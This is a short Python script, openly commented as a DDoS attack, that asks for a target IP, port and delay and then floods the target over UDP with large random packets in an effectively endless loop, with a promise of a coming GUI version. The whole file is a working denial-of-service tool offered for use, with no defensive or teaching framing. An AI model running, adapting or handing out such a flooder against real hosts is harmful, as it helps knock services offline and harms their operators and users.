#Modules
import socket, random, time


#Socket setup
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 #Input Varibles
ip = input("Enter Target IP: ")
port = int(input("Enter Target Port: "))
sleep = int(input("Sleep: "))


 #Establishes a connection with the target
s.connect((ip, port))
 
 #DDoS attack
for i in range(1, 100**1000):
    s.send(random._urandom(10)*1000)
    print(f"Send: {i}", end='\r')
    time.sleep(sleep)

#GUI Version will be avalible soon!